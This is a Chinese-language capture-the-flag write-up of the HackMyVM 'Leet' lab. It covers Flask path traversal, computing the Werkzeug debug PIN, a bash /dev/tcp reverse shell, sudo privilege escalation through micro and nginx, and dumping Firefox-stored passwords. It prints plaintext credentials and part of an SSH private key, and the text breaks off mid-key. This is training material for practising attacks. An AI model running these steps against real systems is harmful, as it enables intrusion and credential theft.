{"pageProps":{"postData":{"id":"HackMyVMLeet","contentHtml":"<h1>Leet.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Leet\">https://hackmyvm.eu/machines/machine.php?vm=Leet</a></p>\n</blockquote>\n<p>Notes：<strong>Enjoy it.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜Leet nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:56 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00019s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.000088s latency).\nMAC Address: 08:00:27:02:0A:DA (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.46\nHost is up (0.00023s latency).\nMAC Address: 08:00:27:43:50:51 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.47\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Leet nmap -sT -min-rate 10000 -p- 192.168.56.47\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:57 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.47\nHost is up (0.00049s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n7777/tcp open  cbt\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 8.09 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Leet nmap -sT -A -T4 -O -p 22,7777 192.168.56.47\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-20 23:57 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.47\nHost is up (0.00024s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey: \n|   256 e1:5d:7c:b7:07:92:17:dc:46:76:7d:be:a9:50:43:d2 (ECDSA)\n|_  256 a0:f3:b3:86:93:f5:58:82:88:<span class=\"hljs-built_in\">dd</span>:e5:10:db:35:de:62 (ED25519)\n7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html; charset=utf-8).\n|_http-server-header: Werkzeug/3.0.1 Python/3.11.2\nMAC Address: 08:00:27:B0:63:BE (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.24 ms 192.168.56.47\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.98 seconds\n</span></code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p><code>7777</code> 是 web 端口</p>\n<p><img src=\"/post-images/HackMyVMLeet/image.png\" alt=\"image.png\"></p>\n<p>看样子是一个 <strong><code>Leet</code></strong> 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字或是特殊符号，例如E写成3、A写成@等。</p>\n<p>并且提供了下载链接</p>\n<p><img src=\"/post-images/HackMyVMLeet/image1.png\" alt=\"image.png\"></p>\n<h3>任意文件读取</h3>\n<p>感觉会存在任意文件读取</p>\n<p>在报错页面能知道是 <code>flask</code> 搭建的</p>\n<p><img src=\"/post-images/HackMyVMLeet/image2.png\" alt=\"image.png\"></p>\n<p>构造恶意连接，成功读取。存在<code>riva</code>用户。</p>\n<p><img src=\"/post-images/HackMyVMLeet/image3.png\" alt=\"image.png\"></p>\n<p>根据错误页面能知道程序位于 <code>/opt/project/app.py</code> ，构造恶意链接进行读取，但是没什么利用点</p>\n<pre><code class=\"hljs language-bash\">from flask import Flask, request, send_file, abort, render_template_string\nfrom werkzeug.exceptions import BadRequest\nimport os\n\napp = Flask(__name__)\napp.config[<span class=\"hljs-string\">'DEBUG'</span>] = True \n\n@app.route(<span class=\"hljs-string\">'/'</span>, methods=[<span class=\"hljs-string\">'GET'</span>, <span class=\"hljs-string\">'POST'</span>])\ndef leet_converter():\n    <span class=\"hljs-keyword\">if</span> request.method == <span class=\"hljs-string\">'POST'</span>:\n        text = request.form[<span class=\"hljs-string\">'text'</span>]\n        leet_text = text.translate(str.maketrans(<span class=\"hljs-string\">\"aeios\"</span>, <span class=\"hljs-string\">\"43105\"</span>))\n        output_filename = <span class=\"hljs-string\">\"/tmp/converted_text.txt\"</span>\n        with open(output_filename, <span class=\"hljs-string\">\"w\"</span>) as f:\n            f.write(leet_text)\n        <span class=\"hljs-built_in\">return</span> render_template_string(<span class=\"hljs-string\">''</span><span class=\"hljs-string\">'\n            &#x3C;!DOCTYPE html>\n            &#x3C;html>\n            &#x3C;head>\n\t\t&#x3C;title>L33T Convertor&#x3C;/title>\n                &#x3C;style>\n                    body { background-color: #333; color: #ddd; font-family: \"Courier New\", Courier, monospace; margin: 0; padding: 20px; }\n                    .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }\n                    h2 {\n\t\t    color: #eee;\n    \t\t    text-align: center;\n\t\t    }\n\n                    a, a:visited { color: #dcdcdc; text-decoration: underline; }\n                    a:hover { color: #ffffff; }\n                    form { display: flex; flex-direction: column; }\n                    input[type=\"text\"], input[type=\"submit\"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }\n                    input[type=\"submit\"] { cursor: pointer; }\n                    input[type=\"submit\"]:hover { background: #666; }\n                &#x3C;/style>\n            &#x3C;/head>\n            &#x3C;body>\n                &#x3C;div class=\"container\">\n                    &#x3C;h2>L33T converter&#x3C;/h2>\n                    &#x3C;form method=\"post\">\n                        &#x3C;input type=\"text\" name=\"text\" placeholder=\"Type your text here\">\n                        &#x3C;input type=\"submit\" value=\"Convert to L33T\">\n                    &#x3C;/form>\n                    {% if leet_text %}\n                        &#x3C;p>Résultat : {{ leet_text }}&#x3C;/p>\n                        &#x3C;a href=\"/download?filename=converted_text.txt\">Download file text&#x3C;/a>\n                    {% endif %}\n                &#x3C;/div>\n            &#x3C;/body>\n            &#x3C;/html>\n        '</span><span class=\"hljs-string\">''</span>, leet_text=leet_text)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> render_template_string(<span class=\"hljs-string\">''</span><span class=\"hljs-string\">'\n            &#x3C;!DOCTYPE html>\n            &#x3C;html>\n            &#x3C;head>\n                &#x3C;style>\n                    body { background-color: #333; color: #ddd; font-family: \"Courier New\", Courier, monospace; margin: 0; padding: 20px; }\n                    .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }\n                    h2 { color: #eee; }\n                    form { display: flex; flex-direction: column; }\n                    input[type=\"text\"], input[type=\"submit\"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }\n                    input[type=\"submit\"] { cursor: pointer; }\n                    input[type=\"submit\"]:hover { background: #666; }\n                &#x3C;/style>\n            &#x3C;/head>\n            &#x3C;body>\n                &#x3C;div class=\"container\">\n                    &#x3C;center>&#x3C;h2>L33T Converter&#x3C;/h2>&#x3C;/center>\n                    &#x3C;form method=\"post\">\n                        &#x3C;input type=\"text\" name=\"text\" placeholder=\"Type your text here\">\n                        &#x3C;input type=\"submit\" value=\"Convert to L33T\">\n                    &#x3C;/form>\n                &#x3C;/div>\n            &#x3C;/body>\n            &#x3C;/html>\n        '</span><span class=\"hljs-string\">''</span>)\n\n@app.route(<span class=\"hljs-string\">'/download'</span>)\ndef download_file():\n    filename = request.args.get(<span class=\"hljs-string\">'filename'</span>)\n\n    <span class=\"hljs-keyword\">if</span> not filename or filename.startswith(<span class=\"hljs-string\">\"/\"</span>):\n        raise ValueError(<span class=\"hljs-string\">\"Parameter 'filename' invalid or missing.\"</span>)\n\n    filepath = os.path.join(<span class=\"hljs-string\">\"/tmp\"</span>, filename)\n\n    try:\n        <span class=\"hljs-built_in\">return</span> send_file(filepath, as_attachment=True)\n    except Exception as e:\n        raise e\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    app.run(debug=True, host=<span class=\"hljs-string\">'0.0.0.0'</span>)\n</code></pre>\n<p>扫描一下目录，寻找敏感文件，打算利用任意文件读取</p>\n<pre><code class=\"hljs language-bash\">➜  Leet dirsearch -u http://192.168.56.47:7777 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Leet/reports/http_192.168.56.47_7777/_25-04-21_00-26-36.txt\n\nTarget: http://192.168.56.47:7777/\n\n[00:26:36] Starting: \n[00:26:51] 200 -    2KB - /console\n[00:26:53] 500 -   14KB - /download\n\nTask Completed\n</code></pre>\n<p>访问 <code>/console</code> ，是<strong>Werkzeug</strong>，能执行命令，但是被锁住了，要求输入<code>PIN</code>码。</p>\n<p><img src=\"/post-images/HackMyVMLeet/image4.png\" alt=\"image.png\"></p>\n<h3>PIN bypass &#x26; 利用</h3>\n<p>在网上寻找 <strong>Werkzeug</strong> 相关漏洞，能找到：<a href=\"https://github.com/wdahlenburg/werkzeug-debug-console-bypass\">https://github.com/wdahlenburg/werkzeug-debug-console-bypass</a></p>\n<p><strong>Werkzeug Debug Console Pin Bypass</strong> 也就是绕过控制 PIN</p>\n<blockquote>\n<p>Werkzeug has a debug console that requires a pin by default. It's possible to bypass this with an LFI vulnerability or use it as a local privilege escalation vector. The debug console will lock after 10 invalid attempts which requires the server to be restarted for another 10 guesses.</p>\n</blockquote>\n<blockquote>\n<p>Werkzeug 有一个默认需要 pin 的调试控制台。可以使用 LFI 漏洞绕过此问题，或将其用作本地权限提升向量。调试控制台将在 10 次无效尝试后锁定，这需要重新启动服务器以再进行 10 次猜测。</p>\n</blockquote>\n<ul>\n<li>根据文档，我们要得到：<code>username</code> ，<code>Flask</code> ，获取服务器托管的接口的 <code>Mac</code> 地址，Machine_id</li>\n</ul>\n<ol>\n<li>\n<p><code>username</code>：<code>www-data</code>或者<code>riva</code></p>\n</li>\n<li>\n<p><code>Flask</code> 的正确路径：在错误中能看到：<code>/opt/project/venv/lib/python3.11/site-packages/flask/app.py</code></p>\n</li>\n<li>\n<p>获取服务器托管的接口的 <code>Mac</code> 地址：也就是网卡的物理地址</p>\n<p>现在需要获取网卡的<code>MAC</code>地址，因为靶机系统是<code>Debian</code> ，所以配置文件在<code>/etc/network/interfaces</code> ，利用任意文件读取来读取</p>\n<pre><code class=\"hljs language-bash\">/download?filename=../etc/network/interfaces\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># This file describes the network interfaces available on your system</span>\n<span class=\"hljs-comment\"># and how to activate them. For more information, see interfaces(5).</span>\n\n<span class=\"hljs-built_in\">source</span> /etc/network/interfaces.d/*\n\n<span class=\"hljs-comment\"># The loopback network interface</span>\nauto lo\niface lo inet loopback\n\n<span class=\"hljs-comment\"># The primary network interface</span>\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n</code></pre>\n<p>再读取网卡 <code>enp0s3</code> 的 MAC</p>\n<pre><code class=\"hljs language-bash\">/download?filename=../sys/class/net/enp0s3/address\n</code></pre>\n<pre><code class=\"hljs language-bash\">08:00:27:b0:63:be\n</code></pre>\n<p>将 <code>MAC</code> 地址从十六进制转换为十进制</p>\n<pre><code class=\"hljs language-bash\">Python 3.12.7 (main, Nov  8 2024, 17:55:36) [GCC 14.2.0] on linux\nType <span class=\"hljs-string\">\"help\"</span>, <span class=\"hljs-string\">\"copyright\"</span>, <span class=\"hljs-string\">\"credits\"</span> or <span class=\"hljs-string\">\"license\"</span> <span class=\"hljs-keyword\">for</span> more information.\n>>> <span class=\"hljs-string\">\"\"</span>.<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">\"08:00:27:b0:63:be\"</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">\":\"</span>))\n<span class=\"hljs-string\">'080027b063be'</span>\n>>> <span class=\"hljs-built_in\">print</span>(0x080027b063be)\n8796758893502\n</code></pre>\n</li>\n<li>\n<p>Machine_id</p>\n<pre><code class=\"hljs language-bash\">/download?filename=../etc/machine-id\nf6791f240ce6407ea271e86b78ac3bdb\n</code></pre>\n<pre><code class=\"hljs language-bash\">/download?filename=../proc/sys/kernel/random/boot_id\n23657fbb-d0b2-4bfa-9387-3d1cc930d11a\n</code></pre>\n<pre><code class=\"hljs language-bash\">/download?filename=../proc/self/cgroup\n0::/system.slice/flaskapp.service\n</code></pre>\n<p>将值存储到各文件中</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"f6791f240ce6407ea271e86b78ac3bdb\"</span> > machine-id                               \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"23657fbb-d0b2-4bfa-9387-3d1cc930d11a\"</span> > boot_id                                   \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"0::/system.slice/flaskapp.service\"</span> > cgroup \n</code></pre>\n<pre><code class=\"hljs language-bash\">machine_id = b<span class=\"hljs-string\">\"\"</span>\n<span class=\"hljs-keyword\">for</span> filename <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"machine-id\"</span>, <span class=\"hljs-string\">\"boot_id\"</span>:\n    try:\n        with open(filename, <span class=\"hljs-string\">\"rb\"</span>) as f:\n            value = f.readline().strip()\n    except OSError:\n        <span class=\"hljs-built_in\">continue</span>\n\n    <span class=\"hljs-keyword\">if</span> value:\n        machine_id += value\n        <span class=\"hljs-built_in\">break</span>\ntry:\n    with open(<span class=\"hljs-string\">\"cgroup\"</span>, <span class=\"hljs-string\">\"rb\"</span>) as f:\n        machine_id += f.readline().strip().rpartition(b<span class=\"hljs-string\">\"/\"</span>)[2]\nexcept OSError:\n    pass\n\n<span class=\"hljs-built_in\">print</span>(machine_id)\n</code></pre>\n<pre><code class=\"hljs language-bash\">python getID.py              \nb<span class=\"hljs-string\">'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'</span>\n</code></pre>\n</li>\n<li>\n<p>现在通过上面<code>github</code>的脚本获得<code>PIN</code></p>\n<pre><code class=\"hljs language-bash\">python werkzeug-pin-bypass.py \nPin: 416-452-656\n</code></pre>\n</li>\n<li>\n<p>检验 PIN ，输入PIN后，成功进入</p>\n<p><img src=\"/post-images/HackMyVMLeet/image5.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">import os;os.system(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1'\"</span>)\n</code></pre>\n<p><img src=\"/post-images/HackMyVMLeet/image6.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>提权 - to riva</h2>\n<h3>micro 提权</h3>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">www-data@leet:/opt/project$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on leet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on leet:\n    (riva) NOPASSWD: /usr/bin/micro\n</code></pre>\n<p>无需密码以 <code>riva</code> 身份执行<code>micro</code></p>\n<p><code>micro</code> 是一个基于终端的文本编辑器。</p>\n<p><img src=\"/post-images/HackMyVMLeet/image7.png\" alt=\"image.png\"></p>\n<p>这里使用编辑器要先将反弹 <code>shell</code> 升级</p>\n<p>这里推荐：<a href=\"https://www.bilibili.com/video/BV1qp4y1Z7Pv/\">https://www.bilibili.com/video/BV1qp4y1Z7Pv/</a> | <a href=\"https://www.cnblogs.com/sainet/p/15783539.html\">https://www.cnblogs.com/sainet/p/15783539.html</a></p>\n<p><img src=\"/post-images/HackMyVMLeet/image8.png\" alt=\"image.png\"></p>\n<p>我们直接添加公钥，然后进行登录即可</p>\n<pre><code class=\"hljs language-bash\">➜  Leet ssh riva@192.168.56.47\nLinux leet.hmv 6.1.0-21-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nriva@leet:~$ to root\n</code></pre>\n<h2>提权 - to root</h2>\n<h3>信息收集</h3>\n<p>查看 <code>sudo</code> 权限需要密码</p>\n<pre><code class=\"hljs language-bash\">➜  Leet ssh riva@192.168.56.47\nLinux leet.hmv 6.1.0-21-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nriva@leet:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> riva: \nSorry, try again.\n</code></pre>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n3a5cf7b35876169c280229c213ed63c1\n</code></pre>\n<p>查看 <code>SUID</code> 情况</p>\n<pre><code class=\"hljs language-bash\">riva@leet:/etc$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/chfn\n</code></pre>\n<p><code>riva</code> 用户家目录</p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 40\ndrwxr-xr-x 6 riva riva 4096 Feb 14  2024 .\ndrwxr-xr-x 3 root root 4096 Feb 14  2024 ..\nlrwxrwxrwx 1 riva riva    9 Feb 11  2024 .bash_history -> /dev/null\n-rw-r--r-- 1 riva riva  220 Feb 14  2024 .bash_logout\n-rw-r--r-- 1 riva riva 3526 Feb 14  2024 .bashrc\ndrwxr-xr-x 3 riva riva 4096 Feb 14  2024 .config\ndrwxr-xr-x 3 riva riva 4096 Feb 14  2024 .<span class=\"hljs-built_in\">local</span>\ndrwx------ 4 riva riva 4096 Feb 14  2024 .mozilla\n-rw-r--r-- 1 riva riva  807 Feb 14  2024 .profile\ndrwx------ 2 riva riva 4096 Apr 21 14:25 .ssh\n-rwx------ 1 riva riva   33 Feb 14  2024 user.txt\n</code></pre>\n<h3>firefox</h3>\n<p>发现 <code>.mozilla</code> 说明存在 <code>firefox</code></p>\n<p>那么我们可以导出 <code>firefox</code> 中的密码（密码本里面保存的）</p>\n<p>项目地址：<a href=\"https://github.com/unode/firefox_decrypt\">https://github.com/unode/firefox_decrypt</a></p>\n<p>克隆到 <code>Kali</code> 中，然后拉取到靶机上</p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ wget 192.168.56.4:8081/firefox_decrypt.py\n--2025-04-21 14:49:19--  http://192.168.56.4:8081/firefox_decrypt.py\nConnecting to 192.168.56.4:8081... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 39405 (38K) [text/x-python]\nSaving to: ‘firefox_decrypt.py’\n\nfirefox_decrypt.py         100%[======================================>]  38.48K  --.-KB/s    <span class=\"hljs-keyword\">in</span> 0s      \n\n2025-04-21 14:49:19 (281 MB/s) - ‘firefox_decrypt.py’ saved [39405/39405]\n</code></pre>\n<p>获取密码</p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ python3 firefox_decrypt.py \nSelect the Mozilla profile you wish to decrypt\n1 -> zbznfk37.default\n2 -> guu30cui.default-esr\n2\nWebsite:   chrome://FirefoxAccounts\nUsername: <span class=\"hljs-string\">'1db9561103ca4adc9afa6357c0a0b554'</span>\nPassword: <span class=\"hljs-string\">'{\"version\":1,\"accountData\":{\"scopedKeys\":{\"https://identity.mozilla.com/apps/oldsync\":{\"kid\":\"1603273389635-IxsZ6HpGK9fL9tUfdcBqwA\",\"k\":\"Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg\",\"kty\":\"oct\"},\"sync:addon_storage\":{\"kid\":\"1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U\",\"k\":\"L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA\",\"kty\":\"oct\"}},\"kSync\":\"43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6\",\"kXCS\":\"231b19e87a462bd7cbf6d51f75c06ac0\",\"kExtSync\":\"2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608\",\"kExtKbHash\":\"360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85\"}}'</span>\n\nWebsite:   http://leet.hmv\nUsername: <span class=\"hljs-string\">'riva'</span>\nPassword: <span class=\"hljs-string\">'PGH$2r0co3L5QL'</span>\n\nWebsite:   https://hackmyvm.eu\nUsername: <span class=\"hljs-string\">'riva'</span>\nPassword: <span class=\"hljs-string\">'lovelove80'</span>\n</code></pre>\n<p>经过测试 <code>PGH$2r0co3L5QL</code> ，是用户 <code>riva</code> 的密码。用户可以以 <code>root</code> 权限执行 <code>nginx</code></p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> riva: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> riva on leet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser riva may run the following commands on leet:\n    (root) /usr/sbin/nginx\n</code></pre>\n<p>我们可以设置 <code>config</code> 文件</p>\n<pre><code class=\"hljs language-bash\">riva@leet:/etc/nginx$ <span class=\"hljs-built_in\">sudo</span> /usr/sbin/nginx -h\nnginx version: nginx/1.22.1\nUsage: nginx [-?hvVtTq] [-s signal] [-p prefix]\n             [-e filename] [-c filename] [-g directives]\n\nOptions:\n  -?,-h         : this <span class=\"hljs-built_in\">help</span>\n  -v            : show version and <span class=\"hljs-built_in\">exit</span>\n  -V            : show version and configure options <span class=\"hljs-keyword\">then</span> <span class=\"hljs-built_in\">exit</span>\n  -t            : <span class=\"hljs-built_in\">test</span> configuration and <span class=\"hljs-built_in\">exit</span>\n  -T            : <span class=\"hljs-built_in\">test</span> configuration, dump it and <span class=\"hljs-built_in\">exit</span>\n  -q            : suppress non-error messages during configuration testing\n  -s signal     : send signal to a master process: stop, quit, reopen, reload\n  -p prefix     : <span class=\"hljs-built_in\">set</span> prefix path (default: /usr/share/nginx/)\n  -e filename   : <span class=\"hljs-built_in\">set</span> error <span class=\"hljs-built_in\">log</span> file (default: stderr)\n  -c filename   : <span class=\"hljs-built_in\">set</span> configuration file (default: /etc/nginx/nginx.conf)\n  -g directives : <span class=\"hljs-built_in\">set</span> global directives out of configuration file\n</code></pre>\n<p>直接用脚本，项目地址：<a href=\"https://github.com/DylanGrl/nginx_sudo_privesc\">https://github.com/DylanGrl/nginx_sudo_privesc</a></p>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ vi exp.sh\nriva@leet:~$ <span class=\"hljs-built_in\">chmod</span> +x exp.sh\nriva@leet:~$ ./exp.sh\n[+] Creating configuration...\n[+] Loading configuration...\n[+] Generating SSH Key...\nGenerating public/private rsa key pair.\nEnter file <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">which</span> to save the key (/home/riva/.ssh/id_rsa):\nEnter passphrase (empty <span class=\"hljs-keyword\">for</span> no passphrase):\nEnter same passphrase again:\nYour identification has been saved <span class=\"hljs-keyword\">in</span> /home/riva/.ssh/id_rsa\nYour public key has been saved <span class=\"hljs-keyword\">in</span> /home/riva/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:lZirJxXN1DzNc6FpZA9cwSb16ZcJfoloWJeBvEQN3NU riva@leet.hmv\nThe key<span class=\"hljs-string\">'s randomart image is:\n+---[RSA 3072]----+\n|          ==*B=*+|\n|         * **=@oE|\n|        + *..Oo=.|\n|         +o.= + +|\n|        S. o o *.|\n|       o  .   . .|\n|      o .        |\n|       o         |\n|                 |\n+----[SHA256]-----+\n[+] Display SSH Private Key for copy...\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEArQl1ktS5B/4u4vEzwrAhHtzv/ULIUDlEdmbY8W57c4y5YisdtE64\nNAUTjY9rxD5qA3knHUjlAShwOkoy/7gjfK67flu9Wl0jhDlY43kSjpOC7Na9j+OHuwTI4F\nmvpqqGh7ECmbQ5Av+bSDjllzpddh+hIy8h4ys+OoqMKMZJMVxybPevIR0EqDC4dtNWi8NK\njZzD6otdPBLxKDpoWemxe9cL3BhjC8ErE8RrQguREm4zci8Fa0gA+XYZ+PUGc37f5NOoel\nafhV4Kdknf/Vwt9WsYF31EStEHXt5CRO7ulrafbTKfDUuXmGXujWPajIiUf6CZqSDsSOhX\nUe5ZtZKxrqFQ48dD+0IgVkyG0SYghlzbRqA5VbQk3ueEirmws8mA0mJNiw86pI+cSAszLi\nVhnQWa54OAJCfo+zuIj+MOEpVsQu72OfrBnmgYn0XKPDGMuwrfMJBAV2VNOJbVNDrV5hlr\nruziWs+7YpHyY0xnElijdMoRc23PUeegrF/sQrEZAAAFiGTRqy9k0asvAAAAB3NzaC1yc2\nEAAAGBAK0JdZLUuQf+LuLxM8KwIR7c7/1CyFA5RHZm2PFue3OMuWIrHbROuDQFE42Pa8Q+\nagN5Jx1I5QEocDpKMv+4I3yuu35bvVpdI4Q5WON5Eo6TguzWvY/jh7sEyOBZr6aqhoexAp\nm0OQL/m0g45Zc6XXYfoSMvIeMrPjqKjCjGSTFccmz3ryEdBKgwuHbTVovDSo2cw+qLXTwS\n8Sg6aFnpsXvXC9wYYwvBKxPEa0ILkRJuM3IvBWtIAPl2Gfj1BnN+3+TTqHpWn4VeCnZJ3/\n1cLfVrGBd9RErRB17eQkTu7pa2n20ynw1Ll5hl7o1j2oyIlH+gmakg7EjoV1HuWbWSsa6h\nUOPHQ/tCIFZMhtEmIIZc20agOVW0JN7nhIq5sLPJgNJiTYsPOqSPnEgLMy4lYZ0FmueDgC\nQn6Ps7iI/jDhKVbELu9jn6wZ5oGJ9FyjwxjLsK3zCQQFdlTTiW1TQ61eYZa67s4lrPu2KR\n8mNMZxJYo3TKEXNtz1HnoKxf7EKxGQAAAAMBAAEAAAGABiOWZmbR6DrQRMiwMI1xZWALCy\noUA4WenFFGi91Ct70jxBv5vjCHSEAwWwa+OOyKdBRXqwovpsB9p9HDWK96odUsrX1ZfNPe\nW1XyBYMBgamx3M97Evhsc7oGGvCPour8oiKJcDTUy3qQUqoDGkANug/B9qa4ze+WMftBoP\n408VGBdUR90//Mrx9oYf3aPZPoiJjp2f/HB2c4I1hcJKl9/KHq56x9UhjQu48ty35vz461\nmEzbBTz9HNyf7AVcbNtQzOxScigKkr8dEU4Y7w+iWHxZ/gzSOVOczHc0tWlbe1j/84V+15\nsNz+7WNHie/nOxweVV28BpiRd87mCR7+Wizr8qq65A66DaMIyGdyhqTI5m/vGDT2kzAkmS\n4jwn9yd8SUxHyy1xn/jNgbn7oeobkDMR0